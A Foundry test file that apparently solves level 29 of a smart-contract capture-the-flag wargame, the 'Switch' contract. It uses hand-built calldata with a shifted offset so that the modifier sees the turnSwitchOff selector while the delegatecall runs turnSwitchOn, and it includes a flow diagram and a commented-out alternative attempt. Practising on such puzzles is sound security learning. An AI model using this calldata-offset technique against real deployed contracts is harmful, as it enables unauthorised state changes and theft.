// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/level29.sol";

contract Level29Attack is Test {
    Switch public _switch;

    function setUp() public {
        _switch = new Switch();
    }

    function testFlipSwitch() public {
        // Full calldata in hex
        //[flipSwitch selector][data offset][padding][turnSwitchOff][length][turnSwitchOn]

        /*


        [EVM starts processing calldata]\

        [Transaction]
             ↓
     [EVM loads calldata]
             ↓
    [Identify flipSwitch(bytes) call]
             ↓
    [Modifier checks position 68 → finds turnSwitchOff selector]
             ↓
    [flipSwitch executes delegatecall]
             ↓
    [EVM processes delegatecall data: length + turnSwitchOn selector]
             ↓
    [turnSwitchOn executes in original contract context]
             ↓
    [Storage updated: switchOn = true]
        */
        bytes
            memory callData = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        (bool success, ) = address(_switch).call(callData);

        require(success, "flipSwitch failed");
        assertTrue(_switch.switchOn());
    }
}

// contract Level29Attack is Test {
//     Switch public _switch;

//     function setUp() public {
//         _switch = new Switch();
//     }

//     function testFlipSwitch() public {
//         Exploit exploit = new Exploit(address(_switch));

//         bytes memory payload = abi.encodeWithSelector(
//             exploit.turnSwitchOff.selector
//         ); //to pass the modifieer
//         (bool success, ) = address(_switch).call(
//             abi.encodeWithSelector(_switch.flipSwitch.selector, payload)
//         );

//         require(success, "flipSwitch failed");
//         assertTrue(_switch.switchOn());
//     }
// }

// contract Exploit {
//     address public switchAddr;

//     constructor(address _switchAddr) {
//         switchAddr = _switchAddr;
//     }

//     // This function will be called by flipSwitch via delegatecall.
//     function turnSwitchOff() public {
//         // This code executes in Switch's storage context.

//         // Now call turnSwitchOn() on Switch contract (normal call)
//         // Because the caller is Switch (due to delegatecall), this modifies the correct storage.
//         (bool success, ) = switchAddr.call(
//             abi.encodeWithSignature("turnSwitchOn()")
//         );
//         require(success, "turnSwitchOn failed");
//     }
// }
